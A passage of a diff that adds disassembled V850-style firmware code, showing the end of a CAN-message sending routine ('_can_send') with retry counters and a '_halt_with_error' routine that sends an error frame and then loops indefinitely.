+febf0644:	00 52       	mov	0, r10
+febf0646:	23 ff 19 00 	ld.w	24[sp], lp
+febf064a:	23 c7 15 00 	ld.w	20[sp], r24
+febf064e:	23 cf 11 00 	ld.w	16[sp], r25
+febf0652:	23 d7 0d 00 	ld.w	12[sp], r26
+febf0656:	23 df 09 00 	ld.w	8[sp], r27
+febf065a:	23 e7 05 00 	ld.w	4[sp], r28
+febf065e:	23 ef 01 00 	ld.w	0[sp], r29
+febf0662:	03 1e 1c 00 	addi	28, sp, sp
+febf0666:	7f 00       	jmp	[lp]
+febf0668:	60 e2       	cmp	0, r28
+febf066a:	b2 1d       	be	febf06a0 <_can_send+0x122>
+febf066c:	5f e2       	add	-1, r28
+febf066e:	dc 56 ff ff 	andi	65535, r28, r10
+febf0672:	60 52       	cmp	0, r10
+febf0674:	aa a5       	bne	febf05b8 <_can_send+0x3a>
+febf0676:	1b 37 04 00 	ld.b	4[r27], r6
+febf067a:	80 ff 04 00 	jarl	febf067e <_can_send+0x100>, lp
+febf067e:	44 fa       	add	4, lp
+febf0680:	78 00       	jmp	[r24]
+febf0682:	b5 9d       	br	febf05b8 <_can_send+0x3a>
+febf0684:	60 e2       	cmp	0, r28
+febf0686:	f2 0d       	be	febf06a4 <_can_send+0x126>
+febf0688:	5f e2       	add	-1, r28
+febf068a:	dc 56 ff ff 	andi	65535, r28, r10
+febf068e:	60 52       	cmp	0, r10
+febf0690:	ea cd       	bne	febf062c <_can_send+0xae>
+febf0692:	1b 37 04 00 	ld.b	4[r27], r6
+febf0696:	80 ff 04 00 	jarl	febf069a <_can_send+0x11c>, lp
+febf069a:	44 fa       	add	4, lp
+febf069c:	7a 00       	jmp	[r26]
+febf069e:	f5 c5       	br	febf062c <_can_send+0xae>
+febf06a0:	01 52       	mov	1, r10
+febf06a2:	a5 d5       	br	febf0646 <_can_send+0xc8>
+febf06a4:	02 52       	mov	2, r10
+febf06a6:	85 d5       	br	febf0646 <_can_send+0xc8>
+
+febf06a8 <_halt_with_error>:
+febf06a8:	c6 36 ff 00 	andi	255, r6, r6
+febf06ac:	d0 32       	shl	16, r6
+febf06ae:	58 1a       	add	-8, sp
+febf06b0:	86 36 ee 01 	ori	494, r6, r6
+febf06b4:	63 ef 01 00 	st.w	r29, 0[sp]
+febf06b8:	63 ff 05 00 	st.w	lp, 4[sp]
+febf06bc:	08 e8       	mov	r8, r29
+febf06be:	bf ff c0 fe 	jarl	febf057e <_can_send>, lp
+febf06c2:	1d 57 04 00 	ld.b	4[r29], r10
+febf06c6:	ca 56 ff 00 	andi	255, r10, r10
+febf06ca:	60 52       	cmp	0, r10
+febf06cc:	c2 05       	be	febf06d4 <_halt_with_error+0x2c>
+febf06ce:	1d 30       	mov	r29, r6
+febf06d0:	bf ff 48 fe 	jarl	febf0518 <_runtime_end.part___0>, lp
+febf06d4:	20 56 7e 15 	movea	5502, r0, r10
+febf06d8:	80 ff 04 00 	jarl	febf06dc <_halt_with_error+0x34>, lp
+febf06dc:	44 fa       	add	4, lp
+febf06de:	6a 00       	jmp	[r10]
+febf06e0:	85 05       	br	febf06e0 <_halt_with_error+0x38>
